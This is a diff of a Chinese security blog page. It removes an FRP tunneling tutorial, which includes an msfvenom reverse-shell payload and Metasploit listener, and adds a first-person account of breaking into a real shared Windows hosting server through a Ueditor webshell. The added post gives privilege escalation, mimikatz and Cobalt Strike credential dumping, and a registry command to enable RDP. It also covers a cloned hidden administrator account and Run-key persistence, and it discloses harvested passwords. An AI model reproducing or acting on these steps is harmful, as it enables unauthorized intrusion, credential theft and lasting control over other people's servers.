@@ -15,30 +15,40 @@
 <link rel="stylesheet" href="/css/tags.css" media="all">
 
 
-<meta name="description" content="Frp简介这是一款基于服务端和客户端之间建立通信后，将客户端的某个端口转发到服务端访问 使用教程下载地址：https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases服务端：linux_amd64客户端：windows_amd64原理：自认为好理解。用一个端口(bind_port &#x3D; 5000)将服务端和客户端产生通信，设置服务(frps.ini)和客户端(frpc.ini)相">
+<meta name="description" content="背景这是前两个月用ueditor漏洞弄的一只站，当时看到是7i24就身心力竭的没有怎么细心看，技术不到家也占一部分哈哈哈，今天登上去看到C盘根目录有被mimikatz抓取得记录文件，觉得有希望，重新看看，站不少就打码处理了。 前期收集信息先是Ueditor Getshell:http:&#x2F;&#x2F;***.cn&#x2F;ueditor&#x2F;net&#x2F;upload&#x2F;image&#x2F;20201017&#x2F;63743489112455">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Frp内网转发&#x2F;穿透使用">
-<meta property="og:url" content="https://www.tu3k.cn/2020/12/28/frp/index.html">
+<meta property="og:title" content="记录一次7i24星外虚拟主机提权">
+<meta property="og:url" content="https://www.tu3k.cn/2021/01/04/7i24tiquan/index.html">
 <meta property="og:site_name">
-<meta property="og:description" content="Frp简介这是一款基于服务端和客户端之间建立通信后，将客户端的某个端口转发到服务端访问 使用教程下载地址：https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases服务端：linux_amd64客户端：windows_amd64原理：自认为好理解。用一个端口(bind_port &#x3D; 5000)将服务端和客户端产生通信，设置服务(frps.ini)和客户端(frpc.ini)相">
+<meta property="og:description" content="背景这是前两个月用ueditor漏洞弄的一只站，当时看到是7i24就身心力竭的没有怎么细心看，技术不到家也占一部分哈哈哈，今天登上去看到C盘根目录有被mimikatz抓取得记录文件，觉得有希望，重新看看，站不少就打码处理了。 前期收集信息先是Ueditor Getshell:http:&#x2F;&#x2F;***.cn&#x2F;ueditor&#x2F;net&#x2F;upload&#x2F;image&#x2F;20201017&#x2F;63743489112455">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/1.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/2.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/3.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/4.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/5.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/6.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/7.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/8.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/9.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/10.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/11.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/frp/12.png">
-<meta property="article:published_time" content="2020-12-28T08:45:11.000Z">
-<meta property="article:modified_time" content="2020-12-28T09:28:03.080Z">
-<meta property="article:tag" content="Frp内网转发">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/1.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/2.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/3.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/4.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/5.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/6.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/7.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/8.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/9.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/10.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/11.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/12.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/13.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/14.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/15.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/16.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/17.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/18.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/19.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/20.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/21.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/7i24/22.png">
+<meta property="article:published_time" content="2021-01-03T20:28:00.000Z">
+<meta property="article:modified_time" content="2021-01-05T05:44:28.896Z">
+<meta property="article:tag" content="星外7i24提权">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.tu3k.cn/images/frp/1.png">
+<meta name="twitter:image" content="https://www.tu3k.cn/images/7i24/1.png">
 
 
     <link rel="icon" href="/images/favicon.ico">
@@ -72,7 +82,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Frp内网转发/穿透使用 | Tu3k's Blog</title>
+<title>记录一次7i24星外虚拟主机提权 | Tu3k's Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -281,11 +291,11 @@
     </div>
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
-      <div class="body-wrap"><article id="post-frp" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-7i24tiquan" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/12/28/frp/" class="article-date">
-      <time datetime="2020-12-28T08:45:11.000Z" itemprop="datePublished">2020-12-28</time>
+      <a href="/2021/01/04/7i24tiquan/" class="article-date">
+      <time datetime="2021-01-03T20:28:00.000Z" itemprop="datePublished">2021-01-04</time>
 </a>
 
 
@@ -300,7 +310,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Frp内网转发/穿透使用
+      记录一次7i24星外虚拟主机提权
     </h1>
   
 
@@ -311,7 +321,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Frp%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91/" rel="tag">Frp内网转发</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%98%9F%E5%A4%967i24%E6%8F%90%E6%9D%83/" rel="tag">星外7i24提权</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -321,20 +331,14 @@
 <div class="article-entry" itemprop="articleBody">
     
         
-        <h2 id="Frp简介"><a href="#Frp简介" class="headerlink" title="Frp简介"></a>Frp简介</h2><p><strong>这是一款基于服务端和客户端之间建立通信后，将客户端的某个端口转发到服务端访问</strong></p>
-<h2 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h2><p>下载地址：<code>https://github.com/fatedier/frp/releases</code><br>服务端：linux_amd64<br>客户端：windows_amd64<br><img src="https://www.tu3k.cn/images/frp/1.png" alt="frp_github" title="frp_github"><br>原理：自认为好理解。用一个端口(<code>bind_port = 5000</code>)将服务端和客户端产生通信，设置服务(frps.ini)和客户端(frpc.ini)相关参数，启动程序(frps.exe和frpc.exe)并指定程序文件(frps.ini和frpc.ini)，转发成功。<br><img src="https://www.tu3k.cn/images/frp/2.png" alt="frp_github1" title="frp_github1"><br>windows和linux都有这俩块文件，所以两个系统都可以转发内网到外网。<br>服务器IP：<code>kali——192.168.235.130</code><br>客户端IP：<code>Win10—192.168.1.155</code></p>
-<h3 id="0x01-WEB端的转发"><a href="#0x01-WEB端的转发" class="headerlink" title="0x01 WEB端的转发"></a>0x01 WEB端的转发</h3><p>服务端：<br>首先解压文件：<code>tar zxvf frp_0.34.3_linux_amd64.tar.gz</code><br>重命名文件夹：<code>mv frp_0.34.3_linux_amd64/ frp</code><br>使用root权限进行修改：<code>sudo gedit frps.ini</code><br><img src="https://www.tu3k.cn/images/frp/3.png" alt="frp_github2" title="frp_github2"><br>9999该端口就是以后访问web服务需要用到的端口  <code>192.168.235.130:9999</code>，访问这个链接就会链接到我们的内网地址，内网地址设置在后面有说。<br>保存退出，启动服务<br><code>./frps -c ./frps.ini</code><br><img src="https://www.tu3k.cn/images/frp/4.png" alt="frp_github3" title="frp_github3"><br>服务端配置完成。<br>客户端：<br>打开frpc.ini<br><img src="https://www.tu3k.cn/images/frp/5.png" alt="frp_github4" title="frp_github4"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.235.130         &#x2F;&#x2F;服务端的地址</span><br><span class="line">server_port &#x3D; 5000                与服务端建立通信的地址  也就是最上面提到的5000</span><br><span class="line">[服务]</span><br><span class="line">type &#x3D; http&#x2F;https                &#x2F;&#x2F;如果是https就写https    注意不要写错 不然接受转发不了</span><br><span class="line">local_ip &#x3D; 内网ip</span><br><span class="line">local_port &#x3D; 内网web服务端口或者其他服务端口</span><br><span class="line">custom_domains &#x3D; vps域名或IP</span><br></pre></td></tr></table></figure>
-<p>例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[web]</span><br><span class="line">type &#x3D; http</span><br><span class="line">local_ip &#x3D; 192.168.1.155</span><br><span class="line">local_port &#x3D; 8080</span><br><span class="line">custom_domain &#x3D; 192.168.235.130</span><br></pre></td></tr></table></figure>
-<p>保存退出，打开cmd切到frp目录启动<br><code>frpc.exe -c frpc.ini</code><br><img src="https://www.tu3k.cn/images/frp/6.png" alt="frp_github5" title="frp_github5"><br>客户端设置完成。<br>此时访问vps ip：<code>http://192.168.235.130:9999/</code><br><img src="https://www.tu3k.cn/images/frp/7.png" alt="frp_github6" title="frp_github6"><br>就访问到了我们本机phpinfo。</p>
-<h3 id="0x02-3389端口转发"><a href="#0x02-3389端口转发" class="headerlink" title="0x02 3389端口转发"></a>0x02 3389端口转发</h3><p>只需在frpc.ini中添加</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[rdp]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 192.168.1.155</span><br><span class="line">local_port &#x3D; 3389</span><br><span class="line">remote_port &#x3D; 2030</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.tu3k.cn/images/frp/8.png" alt="rdp" title="rdp"><br>3389是内网的远程端口，必须要开着才可以转发，2030是转发到外网的2030端口 进行连接，这里是转发到了我kali的2030，所以直接连接  kali-ip:2030  即可登录我的windows主机。<br><img src="https://www.tu3k.cn/images/frp/9.png" alt="rdp" title="rdp"></p>
-<h3 id="0x03-应用场景"><a href="#0x03-应用场景" class="headerlink" title="0x03 应用场景"></a>0x03 应用场景</h3><h4 id="0x03-①"><a href="#0x03-①" class="headerlink" title="0x03 ①"></a>0x03 ①</h4><p>webshell中可以先配置好ini文件然后上传客户端脚本到可执行目录<br>执行frpc.exe -c frpc.ini<br>有时候远程端口不是3389，需要手动去寻找一下远程端口是多少，再修改运行<br>接着我们本机连接vps-ip:转发的端口号  即可</p>
-<h4 id="0x03-②"><a href="#0x03-②" class="headerlink" title="0x03 ②"></a>0x03 ②</h4><p>将msf转发出网，接受反弹的shell<br>首先将服务端文件传到vps上面，配置好通信端口和转发端口 开始运行<br>注意：因为msf监听的payload是tcp 所以这里也要设置tcp<br><img src="https://www.tu3k.cn/images/frp/10.png" alt="msf" title="msf"><br>kali内也设置好类型为tcp<br><img src="https://www.tu3k.cn/images/frp/11.png" alt="msf1" title="msf1"><br>设置完毕启动后，在进行tcp访问vps的2222端口时，会转发到kali的4466端口上，建立shell连接。<br>首先创建payload<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=154.XXX.XXX.135 LPORT=2222 -f exe &gt; shell.exe</code><br>将payload传到目标机器，kali内msf设置监听4466端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.235.130</span><br><span class="line">set LPORT 4466</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p>目标机器执行payload，tcp先会去连接vps的端口，然后vps端口转发到我们kali的4466.形成反弹shell<br><img src="https://www.tu3k.cn/images/frp/12.png" alt="msf1" title="msf1"></p>
+        <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p><strong>这是前两个月用ueditor漏洞弄的一只站，当时看到是7i24就身心力竭的没有怎么细心看，技术不到家也占一部分哈哈哈，今天登上去看到C盘根目录有被mimikatz抓取得记录文件，觉得有希望，重新看看，站不少就打码处理了。</strong></p>
+<h3 id="前期收集信息"><a href="#前期收集信息" class="headerlink" title="前期收集信息"></a>前期收集信息</h3><p>先是Ueditor Getshell:<code>http://***.cn/ueditor/net/upload/image/20201017/6374348911245522335347148.aspx</code><br><img src="https://www.tu3k.cn/images/7i24/1.png" alt="7i24" title="星外主机提权"><br>通过目录发现是freehost主机，翻看目录确认是7i24的星外虚拟主机<br><img src="https://www.tu3k.cn/images/7i24/2.png" alt="freehost" title="freehost"><br>星外主机提权无非两三种</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">① iis低版本和服务器的ee提权</span><br><span class="line">② exp提权</span><br><span class="line">③ 第三方（几率很小都有防护措施）</span><br><span class="line">④ 其他方式</span><br></pre></td></tr></table></figure>
+<p>首先收集了下主机信息<br><img src="https://www.tu3k.cn/images/7i24/3.png" alt="systeminfo" title="systeminfo"><br>iis权限，权限挺大的，起码能执行命令，systeminfo收集了打的补丁情况和主机情况<br><img src="https://www.tu3k.cn/images/7i24/4.png" alt="bug" title="bug"><br>2008 R2/x64/200补丁，查了下漏洞补丁用了些ms16-032、烂土豆没提下，（当时是用烂土豆没提下），接着上了个aspx大马扫了下端口<br><img src="https://www.tu3k.cn/images/7i24/5.png" alt="scanport" title="scanport"><br>想着从mssql和mysql两个入口突破，翻查D盘找到了mysql数据库目录下载用户文件到本地得到root密码，没解开<br><img src="https://www.tu3k.cn/images/7i24/6.png" alt="3306提权" title="3306提权"><br>又访问了D:\freehost目录，发现可以跨目录访问，权限挺大，挨个网站去点，翻配置文件，最后翻到了两个sa的账号密码都没有登录成功  sa 123456/sa zxcv1010<br><img src="https://www.tu3k.cn/images/7i24/7.png" alt="1433提权" title="1433提权"><br>当时是直接无语，过了阵子又上去看这个站，发现C盘根目录被人传了mimikatz.exe和1.log 点进去发现竟然有服务器iis用户的密码，虽然里面没有管理员的，那人能执行mimikatz说明拿到了system权限，就准备重新试试，当时手里有个烂土豆的升级版。</p>
+<h3 id="艾斯比的提升权限"><a href="#艾斯比的提升权限" class="headerlink" title="艾斯比的提升权限"></a>艾斯比的提升权限</h3><p>先cs上了一个iis权限的shell，接着上传exp成功秒<br><img src="https://www.tu3k.cn/images/7i24/8.png" alt="上线cs" title="上线cs"><br>这里有个小细节：<br>针对freehost星外提权有个目录大部分是可读可写可执行的<br><code>&quot;C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Temporary ASP.NET Files\root\e22c2559\92c7e946\hash\&quot;</code><br>在这个目录传了exp，执行的时候需要用引号引起来因为目录有空格，实际执行的时候就算加了引号windows也会出现点问题<br><img src="https://www.tu3k.cn/images/7i24/9.png" alt="突破引号" title="突破引号"><br>例如这个 从中间目录空格处截断掉了，只需要再外围再加一次引号即可<br>“”C:\xxx\dj.exe” -p “whoami””<br>拿到system权限了，net localgroup administrators 查看有多少管理员<br><img src="https://www.tu3k.cn/images/7i24/10.png" alt="查看管理员" title="查看管理员"><br>接着上传了mimikatz抓密码，这里我很sb的在exp的语句内执行的<br><img src="https://www.tu3k.cn/images/7i24/11.png" alt="mimikatz" title="mimikatz"><br>没有进入mimikatz内执行，结果就是出现了很多问题导致抓取失败<br><img src="https://www.tu3k.cn/images/7i24/12.png" alt="faile" title="faile"><br>还传了nc想着能有个交互式的shell来执行mimikatz，服务端也确实接受到了，不过报错了ip: inverse host lookup failed: h_errno 11004: NO_DATA<br>什么命令都不能执行。后来甚至还试了msf上线，上线秒掉，又设置cs迁移到msf也是秒掉，再设置自动迁移进程set autorunscript migrate -n explorer.exe<br>也是掉，还静止等了三四分钟没有回弹过来， 怀疑是不是被拦了呀也没防护呀，又生成了个powershell脚本竟然连接都建立不上，直接给kali放到回收站了。<br>也是突然发现我直接在exp语句内执行cs上线的payload不就默认system权限了，就可以在cs抓密码了（当时不知道为什么执意要抓密码，可能是因为抓密码而起）<br><img src="https://www.tu3k.cn/images/7i24/13.png" alt="getsystem" title="getsystem"><br><img src="https://www.tu3k.cn/images/7i24/14.png" alt="getsystem2" title="getsystem2"><br>可以抓密码了，舒服<br><img src="https://www.tu3k.cn/images/7i24/15.png" alt="hashdump" title="hashdump"><br>解密1用户的密码 zxc123…    可以登录了<br>查询端口开放情况，没有发现3389，taslist /svc查询进程，通过进程来找3389也没有，可以，那就拿几个可疑的端口来登<br><img src="https://www.tu3k.cn/images/7i24/16.png" alt="登录8899端口" title="端口"><br><img src="https://www.tu3k.cn/images/7i24/17.png" alt="远程连接" title="远程连接"><br>协议错误代码0x1104，出现这个错误就是远程端口占用<br>直接开启3389即可<br><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br>再次查询端口<br><img src="https://www.tu3k.cn/images/7i24/18.png" alt="3389" title="3389"><br>连接即可<br><img src="https://www.tu3k.cn/images/7i24/19.png" alt="向日葵" title="向日葵"><br>发现7台远程向日葵主机，可直接控制，其他没啥了</p>
+<h3 id="维持权限篇"><a href="#维持权限篇" class="headerlink" title="维持权限篇"></a>维持权限篇</h3><h4 id="创建继承账号"><a href="#创建继承账号" class="headerlink" title="创建继承账号"></a>创建继承账号</h4><p>新建了一个继承了freehoststruts管理员权限的账号，Guest/@Tu3k.cn<br>先创建Guest账号，设置密码，接着禁用账号，来到注册表<br><img src="https://www.tu3k.cn/images/7i24/20.png" alt="注册表" title="注册表"><br>看到管理员和Guest的十六进制，找到对应的注册表文件夹，将管理员的复制，粘贴到Guest的里面即可<br><img src="https://www.tu3k.cn/images/7i24/21.png" alt="维持权限" title="维持权限"></p>
+<h4 id="添加注册表自启动"><a href="#添加注册表自启动" class="headerlink" title="添加注册表自启动"></a>添加注册表自启动</h4><p><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;sqlserverD&quot; /t REG_SZ /d &quot;D\tu3k.exe&quot; /f</code><br><img src="https://www.tu3k.cn/images/7i24/22.png" alt="注册表自启动" title="注册表自启动"></p>
+<p>OVER，希望正在看文章的你能学到点东西。</p>
 
     
 </div>
@@ -343,13 +347,13 @@
   
     
     <div class="copyright">
-        <p><span>Title:</span><a href="/2020/12/28/frp/">Frp内网转发/穿透使用</a></p>
+        <p><span>Title:</span><a href="/2021/01/04/7i24tiquan/">记录一次7i24星外虚拟主机提权</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
-        <p><span>Created:</span>2020-12-28, 16:45:11</p>
-        <p><span>Updated:</span>2020-12-28, 17:28:03</p>
+        <p><span>Created:</span>2021-01-04, 04:28:00</p>
+        <p><span>Updated:</span>2021-01-05, 13:44:28</p>
         <p>
-            <span>Full URL:</span><a class="post-url" href="/2020/12/28/frp/" title="Frp内网转发/穿透使用">https://www.tu3k.cn/2020/12/28/frp/</a>
-            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2020/12/28/frp/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/2021/01/04/7i24tiquan/" title="记录一次7i24星外虚拟主机提权">https://www.tu3k.cn/2021/01/04/7i24tiquan/</a>
+            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/01/04/7i24tiquan/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -361,16 +365,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2020/12/29/kerberos-study/">
-                    个人理解kerberos的作用和运行流程
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2020/12/28/edu_bug/">
-                    某教育系统的基础漏洞检测
+                <a href="/2021/01/03/yinduneiwang/">
+                    记一次印度网站getshell到内网漫游
                 </a>
             </div>
         
@@ -382,7 +380,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Frp%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">Frp简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">使用教程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-WEB%E7%AB%AF%E7%9A%84%E8%BD%AC%E5%8F%91"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 WEB端的转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-3389%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 3389端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">2.3.</span> <span class="toc-text">0x03 应用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-%E2%91%A0"><span class="toc-number">2.3.1.</span> <span class="toc-text">0x03 ①</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-%E2%91%A1"><span class="toc-number">2.3.2.</span> <span class="toc-text">0x03 ②</span></a></li></ol></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">前期收集信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%89%BE%E6%96%AF%E6%AF%94%E7%9A%84%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="toc-number">1.2.</span> <span class="toc-text">艾斯比的提升权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90%E7%AF%87"><span class="toc-number">1.3.</span> <span class="toc-text">维持权限篇</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%BB%A7%E6%89%BF%E8%B4%A6%E5%8F%B7"><span class="toc-number">1.3.1.</span> <span class="toc-text">创建继承账号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">添加注册表自启动</span></a></li></ol></li></ol></li></ol>
         
     </div>
     <style>
@@ -418,7 +416,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Frp内网转发/穿透使用　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"记录一次7i24星外虚拟主机提权　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -438,15 +436,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2020/12/29/kerberos-study/" title="Pre: 个人理解kerberos的作用和运行流程">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
         
 
         <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2020/12/28/edu_bug/" title="Next: 某教育系统的基础漏洞检测">
+            <a href="/2021/01/03/yinduneiwang/" title="Next: 记一次印度网站getshell到内网漫游">
                 <i class="fa fa-angle-right"></i>
             </a>
         
